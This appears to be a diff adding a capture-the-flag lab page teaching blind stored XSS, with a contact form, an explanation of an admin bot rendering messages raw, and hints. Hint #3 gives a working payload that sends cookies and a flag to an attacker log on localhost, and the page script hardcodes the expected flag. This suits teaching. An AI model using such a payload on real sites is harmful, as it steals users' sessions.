@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Lab 7 — Blind Stored XSS | Hunt Labs</title>
+  <link rel="stylesheet" href="/assets/style.css" />
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">[ HUNT ]</a>
+    <div class="nav-links"><a href="/">Hub</a><a href="/lab7" class="active">Lab 7</a></div>
+    <div class="nav-counter" id="solved-counter"><span class="solved-num">0</span> / 20 solved</div>
+  </div>
+</nav>
+
+<div class="solved-banner" id="solved-banner">Lab 7 Solved — Blind XSS conquered!</div>
+
+<div class="page"><div class="lab-page">
+<div class="lab-main">
+
+  <div class="lab-header">
+    <div class="lab-header-badges"><span class="badge badge-lab">LAB 7</span><span class="badge badge-advanced">Advanced</span></div>
+    <h1>Blind / Second-Order Stored XSS</h1>
+    <p class="lab-header-desc">Your contact form submission is stored and later rendered in an internal admin dashboard you can't see. The payload must beacon back to the attacker origin on its own.</p>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title-icon">&#128140;</span><span class="panel-title">Contact Us</span></div>
+    <div class="panel-body">
+      <form id="contact-form" method="POST" action="/lab7/contact" style="display:flex;flex-direction:column;gap:10px;">
+        <div>
+          <label style="font-size:13px;color:var(--text-muted);">Name</label>
+          <input name="name" class="flag-input" style="width:100%;margin-top:4px;" placeholder="Your name">
+        </div>
+        <div>
+          <label style="font-size:13px;color:var(--text-muted);">Email</label>
+          <input name="email" class="flag-input" style="width:100%;margin-top:4px;" placeholder="you@example.com">
+        </div>
+        <div>
+          <label style="font-size:13px;color:var(--text-muted);">Message</label>
+          <textarea name="message" class="flag-input" style="width:100%;height:100px;margin-top:4px;" placeholder="Your message…"></textarea>
+        </div>
+        <button type="submit" class="btn btn-primary" style="align-self:flex-start;">Send Message</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title-icon">&#128270;</span><span class="panel-title">What's Happening</span></div>
+    <div class="panel-body">
+      <p>Your message is saved and you see a "Thanks" page. But someone else reads it.</p>
+      <div class="terminal" style="margin-top:12px;">
+<span class="hl-green">YOU</span>  →  POST /lab7/contact  →  <span class="hl-yellow">stored in server</span>
+<span class="hl-yellow">ADMIN BOT</span>  →  GET /lab7/admin  →  <span class="hl-red">renders message raw (no encoding)</span>
+<span class="hl-red">PAYLOAD FIRES</span>  →  <span class="hl-blue">beacon to http://localhost:3001/log</span>  →  <span class="hl-green">you see the flag</span>
+      </div>
+      <p style="margin-top:12px;font-size:13px;color:var(--text-muted);">Check the attacker exfil log at <a href="http://localhost:3001" target="_blank">http://localhost:3001</a> to see incoming beacons.</p>
+    </div>
+  </div>
+
+</div>
+<div class="lab-sidebar">
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">Submit Flag</span></div>
+    <div class="panel-body">
+      <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">Get the flag from the attacker exfil log after the admin bot visits.</p>
+      <form class="flag-form" id="flag-form">
+        <input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
+        <button type="submit" class="btn btn-primary btn-full">Submit</button>
+      </form>
+      <div id="flag-alert" class="alert"></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">Attacker Log</span></div>
+    <div class="panel-body">
+      <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">Live view of exfil beacons received at the attacker origin:</p>
+      <div id="exfil-log" style="font-size:12px;font-family:var(--mono);background:var(--surface-2);border:1px solid var(--border);border-radius:var(--radius);padding:10px;min-height:60px;max-height:200px;overflow-y:auto;">
+        <span style="color:var(--text-muted);">Loading…</span>
+      </div>
+      <button class="btn btn-ghost btn-sm" style="margin-top:8px;" onclick="refreshLog()">Refresh</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">Hints</span></div>
+    <div class="panel-body"><div class="hints-list">
+      <div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>You can't see where it fires</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">The admin reads your message in a context you'll never see. Your payload must phone home on its own when it executes anywhere.</div></div>
+      <div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Out-of-band beacon</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">When your payload fires, make it fetch/POST to <code>http://localhost:3001/log</code> with whatever you want to capture (the page's <code>ADMIN_FLAG</code> variable, cookies, etc.).</div></div>
+      <div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>Example payload</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Submit as your message: <code>&lt;img src=x onerror="fetch('http://localhost:3001/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({flag:ADMIN_FLAG,cookie:document.cookie})})"&gt;</code></div></div>
+    </div></div>
+  </div>
+
+</div>
+</div></div>
+
+<script src="/assets/main.js"></script>
+<script>
+const LAB_ID = 'lab7';
+const EXPECTED_FLAG = 'HUNT{blind_xss_fired_upstairs}';
+document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); refreshLog(); });
+
+async function refreshLog() {
+  try {
+    const res = await fetch('http://localhost:3001/log');
+    const data = await res.json();
+    const el = document.getElementById('exfil-log');
+    if (!data.length) { el.textContent = 'No beacons yet.'; return; }
+    el.innerHTML = data.slice(0, 5).map(e =>
+      `<div style="border-bottom:1px solid var(--border);padding:4px 0;"><span style="color:var(--text-muted);">${e.ts}</span><br>${JSON.stringify(e)}</div>`
+    ).join('');
+  } catch(e) { document.getElementById('exfil-log').textContent = 'Error: ' + e.message; }
+}
+</script>
+</body>
+</html>
